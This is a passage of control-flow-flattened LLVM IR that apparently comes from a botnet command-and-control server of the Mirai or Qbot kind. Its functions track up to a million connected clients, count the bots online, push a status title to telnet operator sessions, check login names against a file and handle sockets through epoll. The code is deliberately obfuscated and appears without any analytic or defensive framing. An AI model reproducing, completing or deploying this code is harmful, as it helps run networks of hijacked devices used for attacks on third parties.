  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  store i32 -2019543196, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = load i64, i64* %19, align 8
  %355 = icmp eq i64 %354, 0
  %356 = select i1 %355, i32 772414344, i32 369466576
  store i32 %356, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  store i32 -2019543196, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  store i32 1088867483, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  store i32 850305785, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i32, i32* %18, align 4
  %362 = icmp ne i32 %361, 0
  %363 = select i1 %362, i32 1806860962, i32 682842281
  store i32 %363, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  %365 = load %struct.clientdata_t*, %struct.clientdata_t** %17, align 8
  %366 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %365, i32 0, i32 3
  store i8 0, i8* %366, align 1
  %367 = load i32, i32* %16, align 4
  %368 = call i32 @close(i32 %367)
  store i32 682842281, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  store i32 -1426275101, i32* %switchVar
  br label %loopEnd

; <label>:370:                                    ; preds = %loopEntry
  store i32 -481180019, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  store i32 754945540, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = load i32, i32* %8, align 4
  %374 = add nsw i32 %373, 1
  store i32 %374, i32* %8, align 4
  store i32 -1369061938, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  store i32 370509418, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = load i8*, i8** %2, align 8
  ret i8* %377

loopEnd:                                          ; preds = %375, %372, %371, %370, %369, %364, %360, %359, %358, %357, %353, %352, %351, %346, %342, %341, %338, %337, %332, %331, %330, %325, %320, %314, %308, %299, %292, %291, %286, %284, %278, %274, %272, %259, %258, %253, %250, %239, %236, %230, %227, %224, %219, %215, %212, %211, %210, %197, %196, %191, %183, %179, %178, %177, %174, %173, %165, %156, %154, %144, %140, %130, %113, %112, %111, %106, %101, %95, %94, %83, %64, %54, %44, %34, %29, %25, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #4

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #3

declare void @perror(i8*) #1

declare i32 @usleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 2099485958, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2099485958, label %first
    i32 -2050421360, label %11
    i32 -1997510272, label %12
    i32 1914703239, label %21
    i32 -1772300108, label %22
    i32 -1322559995, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %9 = icmp eq i32 %.reload, -1
  %10 = select i1 %9, i32 -2050421360, i32 -1997510272
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  store i32 -1322559995, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i32, i32* %4, align 4
  %14 = or i32 %13, 2048
  store i32 %14, i32* %4, align 4
  %15 = load i32, i32* %3, align 4
  %16 = load i32, i32* %4, align 4
  %17 = call i32 (i32, i32, ...) @fcntl(i32 %15, i32 4, i32 %16)
  store i32 %17, i32* %5, align 4
  %18 = load i32, i32* %5, align 4
  %19 = icmp eq i32 %18, -1
  %20 = select i1 %19, i32 1914703239, i32 -1772300108
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  store i32 -1322559995, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1322559995, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %2, align 4
  ret i32 %24

loopEnd:                                          ; preds = %22, %21, %12, %11, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #4

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @printf(i8*, ...) #1

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  %switchVar = alloca i32
  store i32 -1780944432, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1780944432, label %3
    i32 -439588580, label %7
    i32 1472143374, label %15
    i32 -263154906, label %16
    i32 -1521407801, label %19
    i32 -922503856, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  %6 = select i1 %5, i32 -439588580, i32 -922503856
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i32, i32* %1, align 4
  %9 = sext i32 %8 to i64
  %10 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %9
  %11 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %10, i32 0, i32 3
  %12 = load i8, i8* %11, align 1
  %13 = icmp ne i8 %12, 0
  %14 = select i1 %13, i32 -263154906, i32 1472143374
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  store i32 -1521407801, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %2, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %2, align 4
  store i32 -1521407801, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %1, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %1, align 4
  store i32 -1780944432, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %2, align 4
  ret i32 %23

loopEnd:                                          ; preds = %19, %16, %15, %7, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @joinn() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [1000000 x i8], align 16
  store i32 0, i32* %4, align 4
  %switchVar = alloca i32
  store i32 1283424430, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1283424430, label %6
    i32 1853959833, label %10
    i32 -798149003, label %15
    i32 451142517, label %18
    i32 1299409981, label %19
    i32 314935316, label %23
    i32 -797926070, label %24
    i32 -582552088, label %28
    i32 -443058895, label %42
    i32 -1889295430, label %51
    i32 -1879743830, label %58
    i32 -339201818, label %59
    i32 356124854, label %62
    i32 -1088550967, label %63
    i32 -2123938288, label %66
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp slt i32 %7, 40
  %9 = select i1 %8, i32 1853959833, i32 451142517
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %4, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %12
  %14 = getelementptr inbounds %struct.name, %struct.name* %13, i32 0, i32 1
  store i32 0, i32* %14, align 4
  store i32 -798149003, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %4, align 4
  %17 = add nsw i32 %16, 1
  store i32 %17, i32* %4, align 4
  store i32 1283424430, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 1299409981, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %2, align 4
  %21 = icmp slt i32 %20, 1000000
  %22 = select i1 %21, i32 314935316, i32 -2123938288
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -797926070, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %3, align 4
  %26 = icmp slt i32 %25, 40
  %27 = select i1 %26, i32 -582552088, i32 356124854
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %30
  %32 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %31, i32 0, i32 2
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %32, i32 0, i32 0
  %34 = load i32, i32* %3, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %35
  %37 = getelementptr inbounds %struct.name, %struct.name* %36, i32 0, i32 0
  %38 = getelementptr inbounds [512 x i8], [512 x i8]* %37, i32 0, i32 0
  %39 = call i32 @strcmp(i8* %33, i8* %38) #8
  %40 = icmp eq i32 %39, 0
  %41 = select i1 %40, i32 -443058895, i32 -1879743830
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 3
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 1
  %50 = select i1 %49, i32 -1889295430, i32 -1879743830
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %53
  %55 = getelementptr inbounds %struct.name, %struct.name* %54, i32 0, i32 1
  %56 = load i32, i32* %55, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %55, align 4
  store i32 -1879743830, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 -339201818, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  store i32 -797926070, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  store i32 -1088550967, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %2, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %2, align 4
  store i32 1299409981, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %1, align 4
  ret i32 %67

loopEnd:                                          ; preds = %63, %62, %59, %58, %51, %42, %28, %24, %23, %19, %18, %15, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @Search_in_File(i8*) #0 {
  %.reg2mem = alloca %struct._IO_FILE*
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %.reg2mem
  %.reload2 = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  store %struct._IO_FILE* %.reload2, %struct._IO_FILE** %4, align 8
  %switchVar = alloca i32
  store i32 -1839705322, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1839705322, label %first
    i32 2112496550, label %12
    i32 865985189, label %13
    i32 1869238135, label %14
    i32 -831234033, label %20
    i32 1980699162, label %26
    i32 -671988721, label %30
    i32 -473939837, label %33
    i32 -164196460, label %37
    i32 1179855181, label %40
    i32 382913822, label %44
    i32 -1477317730, label %45
    i32 -2073515940, label %47
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  %10 = icmp eq %struct._IO_FILE* %.reload, null
  %11 = select i1 %10, i32 2112496550, i32 865985189
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 -2073515940, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1869238135, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %16 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %17 = call i8* @fgets(i8* %15, i32 512, %struct._IO_FILE* %16)
  %18 = icmp ne i8* %17, null
  %19 = select i1 %18, i32 -831234033, i32 -473939837
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %22 = load i8*, i8** %3, align 8
  %23 = call i8* @strstr(i8* %21, i8* %22) #8
  %24 = icmp ne i8* %23, null
  %25 = select i1 %24, i32 1980699162, i32 -671988721
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32, i32* %6, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %6, align 4
  %29 = load i32, i32* %5, align 4
  store i32 %29, i32* %7, align 4
  store i32 -671988721, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %5, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %5, align 4
  store i32 1869238135, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = icmp ne %struct._IO_FILE* %34, null
  %36 = select i1 %35, i32 -164196460, i32 1179855181
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %39 = call i32 @fclose(%struct._IO_FILE* %38)
  store i32 1179855181, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  %42 = icmp eq i32 %41, 0
  %43 = select i1 %42, i32 382913822, i32 -1477317730
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -2073515940, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %7, align 4
  store i32 %46, i32* %2, align 4
  store i32 -2073515940, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %2, align 4
  ret i32 %48

loopEnd:                                          ; preds = %45, %44, %40, %37, %33, %30, %26, %20, %14, %13, %12, %first, %switchDefault
  br label %loopEntry
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define void @client_addr(i64, i64) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = bitcast %struct.sockaddr_in* %3 to { i64, i64 }*
  %5 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i32 0, i32 0
  store i64 %0, i64* %5, align 4
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i32 0, i32 1
  store i64 %1, i64* %6, align 4
  %7 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %7, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = and i32 %9, 255
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %12 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %11, i32 0, i32 0
  %13 = load i32, i32* %12, align 4
  %14 = and i32 %13, 65280
  %15 = lshr i32 %14, 8
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  %18 = load i32, i32* %17, align 4
  %19 = and i32 %18, 16711680
  %20 = lshr i32 %19, 16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  %23 = load i32, i32* %22, align 4
  %24 = and i32 %23, -16777216
  %25 = lshr i32 %24, 24
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i32 0, i32 0), i32 %10, i32 %15, i32 %20, i32 %25)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @hostname_to_ip(i8*, i8*) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.in_addr**, align 8
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 -392445908, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -392445908, label %first
    i32 -1034204576, label %13
    i32 -930803003, label %14
    i32 -773869945, label %19
    i32 382936114, label %27
    i32 -1933528417, label %38
    i32 1857283293, label %41
    i32 -1838731830, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %11 = icmp eq %struct.hostent* %.reload, null
  %12 = select i1 %11, i32 -1034204576, i32 -930803003
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i32 0, i32 0)) #7
  store i32 1, i32* %3, align 4
  store i32 -1838731830, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = bitcast i8** %17 to %struct.in_addr**
  store %struct.in_addr** %18, %struct.in_addr*** %7, align 8
  store i32 0, i32* %8, align 4
  store i32 -773869945, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %21 = load i32, i32* %8, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %20, i64 %22
  %24 = load %struct.in_addr*, %struct.in_addr** %23, align 8
  %25 = icmp ne %struct.in_addr* %24, null
  %26 = select i1 %25, i32 382936114, i32 1857283293
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %5, align 8
  %29 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %29, i64 %31
  %33 = load %struct.in_addr*, %struct.in_addr** %32, align 8
  %34 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %33, i32 0, i32 0
  %35 = load i32, i32* %34, align 4
  %36 = call i8* @inet_ntoa(i32 %35) #7
  %37 = call i8* @strcpy(i8* %28, i8* %36) #7
  store i32 0, i32* %3, align 4
  store i32 -1838731830, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %8, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %8, align 4
  store i32 -773869945, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 -1838731830, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %3, align 4
  ret i32 %43

loopEnd:                                          ; preds = %41, %38, %27, %19, %14, %13, %first, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @herror(i8*) #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @titleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca [4 x i8*], align 16
  %7 = alloca i32, align 4
  %8 = alloca [1000 x i8], align 16
  store i8* %0, i8** %3, align 8
  %9 = load i8*, i8** %3, align 8
  %10 = ptrtoint i8* %9 to i64
  %11 = trunc i64 %10 to i32
  store i32 %11, i32* %4, align 4
  %12 = bitcast [4 x i8*]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* bitcast ([4 x i8*]* @titleWriter.spinbuf to i8*), i64 32, i32 16, i1 false)
  %13 = bitcast [1000 x i8]* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1000, i32 16, i1 false)
  %switchVar = alloca i32
  store i32 -673975811, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -673975811, label %14
    i32 -2097451120, label %15
    i32 990138398, label %20
    i32 2015166820, label %37
    i32 710974388, label %38
    i32 -1100218794, label %40
    i32 1506939006, label %43
    i32 1288599720, label %44
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -2097451120, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %7, align 4
  %17 = sext i32 %16 to i64
  %18 = icmp ult i64 %17, 4
  %19 = select i1 %18, i32 990138398, i32 1506939006
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 2048, i32 16, i1 false)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = call i32 @clientsConnected()
  %24 = load i32, i32* %7, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds [4 x i8*], [4 x i8*]* %6, i64 0, i64 %25
  %27 = load i8*, i8** %26, align 8
  %28 = getelementptr inbounds [1000 x i8], [1000 x i8]* %8, i32 0, i32 0
  %29 = call i32 (i8*, i8*, ...) @sprintf(i8* %22, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.23, i32 0, i32 0), i32 27, i32 %23, i8* %27, i8* %28, i32 7) #7
  %30 = load i32, i32* %4, align 4
  %31 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %32 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %33 = call i64 @strlen(i8* %32) #8
  %34 = call i64 @send(i32 %30, i8* %31, i64 %33, i32 16384)
  %35 = icmp eq i64 %34, -1
  %36 = select i1 %35, i32 2015166820, i32 710974388
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 710974388, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = call i32 @sleep(i32 1)
  store i32 -1100218794, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %7, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %7, align 4
  store i32 -2097451120, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -673975811, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %2, align 8
  ret i8* %45

loopEnd:                                          ; preds = %43, %40, %38, %37, %20, %15, %14, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetWorker(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca [2048 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [80 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [2048 x i8], align 16
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca %struct._IO_FILE*, align 8
  %23 = alloca %struct._IO_FILE*, align 8
  %24 = alloca [80 x i8], align 16
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca [512 x i8], align 16
  %28 = alloca [512 x i8], align 16
  %29 = alloca [100 x i8*], align 16
  %30 = alloca i8*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %struct._IO_FILE*, align 8
  %33 = alloca %struct._IO_FILE*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca [20 x i8], align 16
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca [50 x i8*], align 16
  %43 = alloca %struct._IO_FILE*, align 8
  %44 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %45 = load i8*, i8** %3, align 8
  %46 = ptrtoint i8* %45 to i64
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %4, align 4
  %48 = load volatile i32, i32* @managesConnected, align 4
